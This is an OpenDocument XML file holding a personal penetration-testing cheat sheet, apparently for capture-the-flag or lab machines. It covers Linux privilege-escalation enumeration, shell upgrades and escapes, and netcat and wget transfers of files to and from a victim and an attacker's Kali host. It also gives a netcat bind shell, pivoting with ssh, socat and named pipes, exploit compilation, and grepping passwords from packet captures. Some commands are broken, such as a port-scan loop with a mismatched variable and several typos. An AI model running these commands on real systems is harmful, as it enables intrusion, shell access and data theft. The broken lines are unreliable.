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"/>
    <style:font-face style:name="menlo" svg:font-family="menlo"/>
    <style:font-face style:name="trebuchet ms" svg:font-family="'trebuchet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5054f" officeooo:paragraph-rsid="0015054f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054f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Privilege Escalation</text:p>
      <text:p text:style-name="Standard">sudo -l <text:s text:c="5"/>--&gt; Check for root priv directories and applications </text:p>
      <text:p text:style-name="Standard">sudo bash <text:s/>--&gt; Get Root Shell </text:p>
      <text:p text:style-name="Standard">sudo id <text:s text:c="6"/>--&gt; Check Privilege level</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">Operating System Details </text:span><text:s/></text:p>
      <text:p text:style-name="Standard">uname -a <text:s text:c="2"/></text:p>
      <text:p text:style-name="Standard">cat /proc/version</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">ps aux | grep root <text:s/>--&gt; check for Applications running with root <text:s/></text:p>
      <text:p text:style-name="Standard">ps -ef</text:p>
      <text:p text:style-name="Standard">dpkg -l --&gt; list all available packages.</text:p>
      <text:p text:style-name="Standard">python -c 'import pty;pty.spawn("/bin/bash")' <text:s/>--&gt; spwan a python shell; sometimes python3 works as well</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Get Interactive She<text:span text:style-name="T2">ll</text:span></text:p>
      <text:p text:style-name="Standard">python -c 'import pty;pty.spawn("/bin/bash")'</text:p>
      <text:p text:style-name="Standard">ctrl +Z </text:p>
      <text:p text:style-name="Standard">stty raw -echo</text:p>
      <text:p text:style-name="Standard">fg</text:p>
      <text:p text:style-name="Standard">export TERM=xterm </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Finding Files with Root Privileges: </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">find / -perm -4000 2&gt;/dev/null | xargs ls -la</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Finding World Readable Files:</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard">find / -perm -2 ! -type l -ls 2&gt;/dev/null</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">World Writable &amp; Executable files</text:p>
      <text:p text:style-name="Standard">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">World Executable Folders:</text:p>
      <text:p text:style-name="Standard">find / -perm -o x -type d 2&gt;/dev/null</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Find SUID &amp; SGID <text:s/>Binaries:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null <text:s text:c="3"/># SGID or SUID</text:p>
      <text:p text:style-name="Standard">for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">find / -perm -1000 -type d 2&gt;/dev/null <text:s text:c="4"/>#Only the owner of the directory or the owner of a file can delete or rename here.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">find / -perm -g=s -type f 2&gt;/dev/null <text:s text:c="5"/>#SGID (chmod 2000) - run as the group, not the user who started it.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:soft-page-break/>find / -perm -u=s -type f 2&gt;/dev/null <text:s text:c="5"/>#SUID (chmod 4000) - run as the owner, not the user who started it.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">List the Capabilities of files <text:s/>which has Root Privileges</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">getcap -r / 2&gt;/dev/null </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Find Services Running Behind Firewall/Localhost </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard">netstat -ano</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">netstat -tulpn</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">CRON Jobs </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">crontab -l</text:p>
      <text:p text:style-name="Standard">ls -alh /var/spool/cron</text:p>
      <text:p text:style-name="Standard">ls -al /etc/ | grep cron</text:p>
      <text:p text:style-name="Standard">ls -al /etc/cron*</text:p>
      <text:p text:style-name="Standard">cat /etc/cron*</text:p>
      <text:p text:style-name="Standard">cat /etc/at.allow</text:p>
      <text:p text:style-name="Standard">cat /etc/at.deny</text:p>
      <text:p text:style-name="Standard">cat /etc/cron.allow</text:p>
      <text:p text:style-name="Standard">cat /etc/cron.deny</text:p>
      <text:p text:style-name="Standard">cat /etc/crontab</text:p>
      <text:p text:style-name="Standard">cat /etc/anacrontab</text:p>
      <text:p text:style-name="Standard">cat /var/spool/cron/crontabs/root </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">find . -type f -ls <text:s text:c="8"/>--&gt; /Find files in all directories </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Send a File From Kali To Victim</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">nc -nlvp 9001 &lt; exploit.c <text:s/>--&gt; Transfer files from Kali </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">nc YourIpAddress 8001 &gt; /tmp/exploit.c <text:s/>--&gt; Get the file On Target Machine</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">or</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">python -m SimpleHTTPServer 8080 <text:s/>--&gt; Start a communication server on your system</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">wget http://yourip/LinuxEnum.sh <text:s/>--&gt; Run this in target machine to get this file</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Get a File From Victim to Kali</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">on Kali: nc -l -p 8001 &gt; filefoldername</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">on victim: nc -w 5 10.10.14.14 8001 &lt; /usr/local/bin/filename </text:p>
      <text:p text:style-name="P2"><text:soft-page-break/></text:p>
      <text:p text:style-name="P2">When anything can only be run as a specific user:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">sudo -u UserName /bin/bash <text:s text:c="12"/>/works when you see this in sudo -l <text:s text:c="5"/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Port Scanning with NMAP:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">for ip in $(seq 1 65535); do nc -nvzw1 VICTIM_IP $p 2&gt;&amp;1; done | grep open</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Dynamic Port Forwarding </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">nano /etc/proxychains.conf</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">#add the below line </text:p>
      <text:p text:style-name="Standard">socks5 127.0.0.1 1080 </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">On Terminal:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">ssh -D 1080 root@10.10.10.10 <text:s text:c="6"/>/Need Password</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">proxychains netdiscover -r 10.10.10.10/24</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Local Port Forwarding using ssh </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">ssh -L 1080:127.0.0.1:80 root@10.10.10.10</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Remote Port Forwarding using SSH </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">ssh -R 1080:127.0.0.1:80 root@10.10.10.10</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Port Forwarding using Netcat</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">nc -l -p $localport -c "nc $remotehost $remoteport"</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">netcat -nvlp 9001 <text:s text:c="6"/>/Listen on port 9001</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">netcat -l -p 9001 -e /bin/bash <text:s/>/Create a bash shell on port 9001</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">netcat -L KALI_IP:80 -p 8902 <text:s text:c="11"/>/Forward local port 9002 to remote port 80</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">netcat -L kali_IP:80 -p 9002 -x <text:s text:c="7"/>/Port Forward Hex dump</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Port Forwarding using mknod </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard">mknod can be used to make files,directories and FIFO's(Named Pipe)</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">mknod backpipe p / p = create a named pipe</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">nc -l -p Allowed_Inbound_port 0&lt;backpipe | nc 127.0.0.1 22 1&gt;backpipe</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/><text:s text:c="2"/></text:p>
      <text:p text:style-name="Standard"><text:s/>1 = Standard Output</text:p>
      <text:p text:style-name="Standard"><text:s/>0 = Standard Input</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Netcat Relay to Forward SSH on our linux machine with Scenario</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">you are on a windows box, trying to connect to a linux machine whose SSH-22 port inbound traffic is blocked. </text:p>
      <text:p text:style-name="P3">we have a shell on linux machine but not ssh -so trying to get into ssh </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">so, find some port which is open on Linux machine, and use nc to communicate, ex:4444</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">on Linux Machine:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">We need to transfer traffic from port 22 to 4444 and access it on windows machine.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">mknod /tmp/backpipe p</text:p>
      <text:p text:style-name="Standard">nc -l -p 4444 0&lt;/tmp/backpipe | nc localhost 22 1&gt;/tmp/backpipe</text:p>
      <text:p text:style-name="Standard"><text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Port Forwarding using SoCat:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Start a socat listener on Victim_macine2 - Port 8009 &amp; 8080, and listen it on First compromisted machine.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">From Victim-1 machine: do a port scan as above and port forrward the required ports</text:p>
      <text:p text:style-name="Standard">/Binding the VICTIM-2 ports to Victim-1 Machine so,that we can access it from our Kali machine</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">socat tcp-listen:8009,fork tcp:VICTIM2_IP:8009 &amp; <text:s/></text:p>
      <text:p text:style-name="Standard">socat tcp-listen:8080,fork tcp:VICTIM2_IP:8080 &amp; </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">netstart -plunt <text:s text:c="3"/>/View the binded ports, we can see 8009 &amp; 8080 in Victim_machine1</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Access the Victim-2 Ports on our Kali Machine:on Victim-1 Machine: </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard">socat tcp-listen:4321,fork tcp:KALI_IP:4321 &amp; </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">Compiling Exploit </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">gcc exploit.c -pthread -lcrypt -o Exploit <text:s/>--&gt; Compile The Exploit</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">gcc -m32 -Wl,--hash-style=both 9542.c -o exploit <text:s/>--&gt; Compiling 32-bit Exploit</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">./Exploit</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Check for Unmounted Drives</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">cat etc/fstab </text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/></text:p>
      <text:p text:style-name="Standard">cat .bash_history <text:s text:c="2"/>--&gt; <text:s/>Check the Commands History</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">cho os.system("/bin/bash") <text:s text:c="6"/>--&gt; Escaping Limited Shell using ssh <text:s text:c="6"/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">df -h <text:s text:c="15"/>--&gt; Get List of Machine Partitions (Mounted Devices as well) </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">/dev/shm <text:s text:c="5"/>--&gt; can copy any files into this location and run without permissions</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">cat /dev/sdb <text:s text:c="14"/>--&gt; Might contain deleted data in the partition</text:p>
      <text:p text:style-name="Standard"><text:s text:c="31"/>can try strings /dev/sdb for flags</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">find / -perm -4000 -user root -exec ls -ld {} \; 2&gt;/dev/null</text:p>
      <text:p text:style-name="Standard"><text:s text:c="10"/>--&gt; all files and dir with root access </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh </text:p>
      <text:p text:style-name="Standard"><text:s text:c="18"/>--&gt; get a proper shell from a restricted shell</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">mysql -u root -p <text:s text:c="14"/>// logging as a root in mysql </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">\! ls -l <text:s text:c="22"/>//Execute Commands </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Finding Passwords from a PCAP file using TCPDUMP:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">tcpdump -nt -r capture.pcap -A 2&gt;/dev/null | grep -P 'pwd='</text:p>
      <text:p text:style-name="Standard"><text:s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"/>
    <style:font-face style:name="menlo" svg:font-family="menlo"/>
    <style:font-face style:name="trebuchet ms" svg:font-family="'trebuchet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14:25:52.295835615</meta:creation-date>
    <dc:date>2021-02-09T14:30:29.410849943</dc:date>
    <meta:editing-duration>PT4M37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5" meta:paragraph-count="126" meta:word-count="928" meta:character-count="5659" meta:non-whitespace-character-count="4587"/>
  </office:meta>
</office:document-meta>
</file>